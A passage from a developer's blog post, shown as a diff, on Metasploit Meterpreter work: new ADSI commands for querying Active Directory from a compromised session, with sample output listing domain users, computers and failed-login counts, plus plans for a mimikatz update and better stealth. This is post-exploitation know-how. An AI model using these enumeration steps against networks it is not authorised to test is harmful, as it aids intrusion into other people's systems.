+Current Clipboard Text
+======================
+
+You have been owned!
+</code></pre>
+
+<p>This rather large chunk of work was merged by <a href="https://twitter.com/egyp7">Egypt</a> and <a href="https://twitter.com/Meatballs__">Meatballs</a>, who deserve a big thanks for wading through my steaming pile of code to make sure it was as stink-free as possible before it landed in master.</p>
+
+<h4 id="adsi-integration">ADSI Integration</h4>
+
+<p>ADSI support isn&rsquo;t currently in the <code>extapi</code> extension that is sitting in Metasploit&rsquo;s master branch. However, there are pull requests for both <a href="https://github.com/rapid7/meterpreter/pull/60">Meterpreter</a> and <a href="https://github.com/rapid7/metasploit-framework/pull/2736">Metasploit</a> which add the very basics for querying Active Directory through Meterpreter.</p>
+
+<pre><code class="language-plain">Extapi: ADSI Management Commands
+================================
+
+    Command             Description
+    -------             -----------
+    adsi_computer_enum  Enumerate all computers on the specified domain.
+    adsi_domain_query   Enumerate all objects on the specified domain that match a filter.
+    adsi_user_enum      Enumerate all users on the specified domain.
+</code></pre>
+
+<p>The core of the work that has been done is in the <code>adsi_domain_query</code> command, as this is the general funnel that is used by the other two commands. It looks like this:</p>
+
+<pre><code>meterpreter &gt; adsi_domain_query 
+
+Usage: adsi_domain_query &lt;domain&gt; &lt;filter&gt; &lt;field 1&gt; [field 2 [field ..]] [-h] [-m maxresults] [-p pagesize]
+
+Enumerate the objects on the target domain.
+
+Enumeration returns the set of fields that are specified.
+
+OPTIONS:
+
+    -h        Help banner
+    -m &lt;opt&gt;  Maximum results to return.
+    -p &lt;opt&gt;  Result set page size.
+
+</code></pre>
+
+<p>Those familiar with LDAP, Active Directory, etc. will be familiar with how this works. As we all know, a console dump speaks volumes, so let&rsquo;s see an example of it being invoked against my old Windows 2000 domain controller VM:</p>
+
+<pre><code class="language-plain">meterpreter &gt; adsi_domain_query windows.old &quot;(|(name=w*)(name=a*))&quot; samaccountname name distinguishedname
+
+windows.old Objects
+===================
+
+samaccountname     name                distinguishedname
+--------------     ----                -----------------
+                   a.root-servers.net  DC=a.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=windows,DC=old
+                   WinsockServices     CN=WinsockServices,CN=System,DC=windows,DC=old
+                   windows.old         DC=windows.old,CN=MicrosoftDNS,CN=System,DC=windows,DC=old
+                   windows             DC=windows,DC=old
+                   AdminSDHolder       CN=AdminSDHolder,CN=System,DC=windows,DC=old
+                   win2k               DC=win2k,DC=windows.old,CN=MicrosoftDNS,CN=System,DC=windows,DC=old
+                   WIN2K               CN=WIN2K,CN=Domain System Volume (SYSVOL share),CN=File Replication Service,CN=System,DC=windows,DC=old
+                   AppCategories       CN=AppCategories,CN=Default Domain Policy,CN=System,DC=windows,DC=old
+Account Operators  Account Operators   CN=Account Operators,CN=Builtin,DC=windows,DC=old
+Administrator      Administrator       CN=Administrator,CN=Users,DC=windows,DC=old
+Administrators     Administrators      CN=Administrators,CN=Builtin,DC=windows,DC=old
+WIN2K$             WIN2K               CN=WIN2K,OU=Domain Controllers,DC=windows,DC=old
+alice              Alice               CN=Alice,CN=Users,DC=windows,DC=old
+
+Total objects: 13
+</code></pre>
+
+<p>You can see that I&rsquo;m searching for any objects in the <code>windows.old</code> domain that have a name starting with <code>w</code> or <code>a</code> and I&rsquo;m asking for the fields <code>samaccountname</code>, <code>name</code> and <code>distinguishedname</code>.</p>
+
+<p>Here&rsquo;s a query for user&rsquo;s that have a name starting with <code>a</code> that lets us know how many attempts they&rsquo;ve had at logging in that have failed:</p>
+
+<pre><code>meterpreter &gt; adsi_domain_query windows.old &quot;(&amp;(objectClass=user)(name=a*))&quot; samaccountname badPwdCount
+
+windows.old Objects
+===================
+
+samaccountname  badPwdCount
+--------------  -----------
+Administrator   9
+alice           0
+
+Total objects: 2
+</code></pre>
+
+<p>With this in place, lots of pre-baked queries can be made that can sit on top and not require much work. I&rsquo;ve put two in there already, just as examples, and they look like this:</p>
+
+<pre><code class="language-plain">meterpreter &gt; adsi_user_enum
+
+Usage: adsi_user_enum &lt;domain&gt; [-h] [-m maxresults] [-p pagesize]
+
+Enumerate the users on the target domain.
+
+Enumeration returns information such as the user name, SAM account name, locked
+status, desc, and comment.
+
+OPTIONS:
+
+    -h        Help banner
+    -m &lt;opt&gt;  Maximum results to return.
+    -p &lt;opt&gt;  Result set page size.
+
+meterpreter &gt; adsi_user_enum windows.old
+
+windows.old Users
+=================
+
+samaccountname  name            distinguishedname                                 description                                                                              comment
+--------------  ----            -----------------                                 -----------                                                                              -------
+Administrator   Administrator   CN=Administrator,CN=Users,DC=windows,DC=old       Built-in account for administering the computer/domain                                   
+Guest           Guest           CN=Guest,CN=Users,DC=windows,DC=old               Built-in account for guest access to the computer/domain                                 
+IUSR_WIN2K      IUSR_WIN2K      CN=IUSR_WIN2K,CN=Users,DC=windows,DC=old          Built-in account for anonymous access to Internet Information Services                   Built-in account for anonymous access to Internet Information Services
+IWAM_WIN2K      IWAM_WIN2K      CN=IWAM_WIN2K,CN=Users,DC=windows,DC=old          Built-in account for Internet Information Services to start out of process applications  Built-in account for Internet Information Services to start out of process applications
+SCHMIDT$        schmidt         CN=schmidt,CN=Computers,DC=windows,DC=old         test PC                                                                                  
+TsInternetUser  TsInternetUser  CN=TsInternetUser,CN=Users,DC=windows,DC=old      This user account is used by Terminal Services.                                          
+WIN2K$          WIN2K           CN=WIN2K,OU=Domain Controllers,DC=windows,DC=old  This is a TEST.                                                                          
+alice           Alice           CN=Alice,CN=Users,DC=windows,DC=old                                                                                                        
+bob             BOB             CN=BOB,CN=Users,DC=windows,DC=old                                                                                                          
+fido            fido            CN=fido,CN=Users,DC=windows,DC=old                                                                                                         
+krbtgt          krbtgt          CN=krbtgt,CN=Users,DC=windows,DC=old              Key Distribution Center Service Account                                                  
+
+Total users: 11
+</code></pre>
+
+<pre><code class="language-plain">meterpreter &gt; adsi_computer_enum 
+
+Usage: adsi_computer_enum &lt;domain&gt; [-h] [-m maxresults] [-p pagesize]
+
+Enumerate the computers on the target domain.
+
+Enumeration returns information such as the computer name, desc, and comment.
+
+OPTIONS:
+
+    -h        Help banner
+    -m &lt;opt&gt;  Maximum results to return.
+    -p &lt;opt&gt;  Result set page size.
+
+windows.old Computers
+=====================
+
+name     distinguishedname                                 description      comment
+----     -----------------                                 -----------      -------
+WIN2K    CN=WIN2K,OU=Domain Controllers,DC=windows,DC=old  This is a TEST.  
+schmidt  CN=schmidt,CN=Computers,DC=windows,DC=old         test PC          
+
+Total computers: 2
+</code></pre>
+
+<p>If you like this idea, then watch carefully because this should be landing in a Metasploit installation near you very soon.</p>
+
+<h2 id="doxygen-documentation">Doxygen documentation</h2>
+
+<p>Documentation. It&rsquo;s the downfall of almost every software project. Open Source tends to suffer more so. Meterpreter&rsquo;s history has been slightly tarnished thanks to the lack of documentation, but that is something that we&rsquo;re working to fix. The issue of documentation can be solved in many ways, and the way that we&rsquo;ve decided to start solving the problem with Meterpreter is by using <a href="http://www.doxygen.org/">Doxygen</a> and slowly, but surely, work our way through the source and add whatever documentation we can.</p>
+
+<p>Needless to say this is a big job. The team is aiming to write more documentation with each commit so that we can cover the source base during the course of doing normal work.</p>
+
+<p>The generated Doxygen documentation can be found on the <a href="https://ci.metasploit.com/job/MeterpreterWinDocs/lastSuccessfulBuild/artifact/docs/html/index.html">Metasploit CI server</a>. This gets updated each time a new build is created, so it should always reflect what is currently in the <code>master</code> Meterpreter branch.</p>
+
+<p>People who are interested in getting involved in Meterpreter should look to start by pulling the source, reading bits of code and adding documentation. It might not be glamorous, but it&rsquo;s very much appreciated and is a great way to get familiar with the source before diving into code contributions.</p>
+
+<h2 id="what-s-next">What&rsquo;s Next?</h2>
+
+<p>I&rsquo;m happy to say that Rapid7 are keeping me on for a while longer! There&rsquo;s always more to do with Meterpreter and never enough time to do it. While I can&rsquo;t say for sure what will be done next, I can generalise by saying that it&rsquo;ll most likely include:</p>
+
+<ul>
+<li>Fixing compatibility issues with newer versions of Windows, particularly with regards to things like packet capture, pivoting, etc.</li>
+<li>Resolving the issue with non-tcp payload binaries failing to shutdown.</li>
+<li>Removing the last of the issues that result in crashes or general instability.</li>
+<li>Updating <code>mimikatz</code> to v2.0 (already in progress!).</li>
+<li>Trying to improve Meterpreter&rsquo;s stealth and protect it from being investigated.</li>
+<li>Finalising the streaming work so that <code>clipboard_monitor</code> can become a reality.</li>
+<li>Adding improvements and features to things like the ADSI support and <code>extapi</code> (coming very soon).</li>
+<li>Working through the general backlog of bugs.</li>
+<li>Working on some things that I won&rsquo;t talk about publicly.</li>
+<li>Hopefully keeping the Rapid7 folks happy so that I can continue to work with them.</li>
+</ul>
+
+<p>If you have suggestions, let&rsquo;s hear them! Even better, submit a PR, and to encourage you:</p>
+
+<blockquote>
+<p>I will personally send a quality, quintessentially Australian fluffy crocodile toy via snail-mail to the first non-Rapid7 person who submits a pull request with a non-trivial fix or contribution to Meterpreter and have it merged into master.</p>
+</blockquote>
+
+<p>That&rsquo;s right, you could be a winner of some Oz awesome! So get coding, it&rsquo;s not that hard&hellip; any more!</p>
+
+<h2 id="what-is-that-it">What? Is that it?</h2>
+
+<p>I know it doesn&rsquo;t appear like much for just 3 short months, but yes that&rsquo;s basically it. There are lots of other small fixes, tweaks, adjustments, etc. along the way but nothing that really kept me tied up for extended periods like the stuff that&rsquo;s listed in here. I&rsquo;m aiming to lift the throughput, but as time goes by it gets <em>harder</em> to add big chunks of value. However, the job of someone like me is to make myself obsolete, as that would imply there&rsquo;s nothing more I can do to make it better. In other words, I&rsquo;ll have made it as good as I am capable of making it.</p>
+
+<h2 id="gratitude">Gratitude</h2>
+
+<p>I&rsquo;ve had an absolute blast working on Meterpreter these last few months, and I want to publicly acknowledge some folks who have been super supportive since I started. The first is <a href="https://twitter.com/todb">Tod</a> for giving me the chance to work with Rapid7 in the first place, and for being awesome to work for/with since kicking off. I&rsquo;ve thoroughly enjoyed being part of his team. I&rsquo;m also <em>very</em> grateful that he&rsquo;s happy for me to stay on a bit longer to do more!</p>
+
+<p>Second is <a href="https://twitter.com/egyp7">Egypt</a>. Not only is this bloke super smart and super nice, but he seems to have unending patience when it comes to me and my stupid questions. It&rsquo;s humbling to be in the presence of this guy, and it was a career highlight to meet him this year at <a href="https://ruxconbreakpoint.com/">BPX</a>/<a href="http://ruxcon.org.au/">Rux</a> and get to share some stories over a scotch or three.</p>
+
+<p>Next, a collective holler to the other legendary Rapid7 folk who put up with me every day and who are a constant source of inspiration and learnings: <a href="https://twitter.com/TheLightCosine">TheLightCosine</a>, <a href="https://twitter.com/_juan_vazquez_">Juan</a>, <a href="https://twitter.com/_sinn3r">sinn3r</a>, <a href="https://twitter.com/wvuuuuuuuuuuuuu">wvu</a>, <a href="https://twitter.com/blt04">Brandon</a> and <a href="https://twitter.com/hdmoore">HD Moore</a>. Just being present when these people have a conversation is enough to make me realise how much more I need to learn and vast their abilities are. Thanks to you all for your time and support. I am easily the dumbest guy in the room which means I&rsquo;m in the right room!</p>
+
+<p>To the general security community folk who, despite not being involved with Rapid7, have given me time and support beyond that which I deserve while working on Meterpreter and trying to make the jump into the security field: <a href="https://twitter.com/pipes">Pipes</a>, <a href="https://twitter.com/mubix">Mubix</a>, <a href="https://twitter.com/kernelsmith">Kernelsmith</a>, <a href="https://twitter.com/Meatballs__">Meatballs</a> (thanks for landing those PRs!), <a href="https://twitter.com/zeknox">Zeknox</a>, <a href="https://twitter.com/Mateusz_Jozef">Matthew Risck</a>, <a href="https://twitter.com/smilingraccoon">SmilingRaccoon</a>, <a href="https://twitter.com/justinsteven">Justin</a>, <a href="https://twitter.com/radac_">radac</a>, <a href="https://twitter.com/sw1tch1ng">sw1tch</a>, <a href="https://twitter.com/sebbity">Novex</a>, <a href="https://twitter.com/ashd_au">Ash</a> and <a href="https://twitter.com/wadealcorn">Wade</a> &hellip; and many others. You&rsquo;re all bloody legends.</p>
+
+<p>I hope I get to continue working on this amazing piece of kit with all these amazing people. I haven&rsquo;t had this much fun in <em>years</em>.</p>
+
+<p>Thanks to you all for reading. I hope you enjoyed it and I hope it broke down some of the barriers between you and Meterpreter contributions. If there are any questions, hit me up via <a href="/contact">email</a>, <a href="https://twitter.com/TheColonial">Twitter</a> or leave a comment here. If you want to get started with Meterpreter contributions I&rsquo;d certainly love to hear from you.</p>
+
+	  
+	  	  <div class="tags">	
+	    <p class="categories">
+	  
+	  <a class="btn btn-default btn-xs text-capitalize" href="/categories/security">Security</a>
+	  
+	  <a class="btn btn-default btn-xs text-capitalize" href="/categories/open-source">Open Source</a>
+	  
+	    </p>
+	    
+
+	    	  </div>
+	    
+
+
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "ojsrants" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+      </div>
+      </div></article>
+
+
+	 </div>
+
+	 </div>
+       </div>
+     </div>
+
+ <div class="container footer">
+  <div class="row">
+    <div class="col-md-10">
+      <small class="text-muted">Copyright OJ Reeves 2019 Theme:<a href="https://feiio.com/">eiio</a></small>
+    </div>
+    <div class="col-md-2">
+      <small class="text-muted">Trying to make the Internet less shit, one bit at a time.</small>
+      </div>
+   </div>
+ </div>
+</body></html>
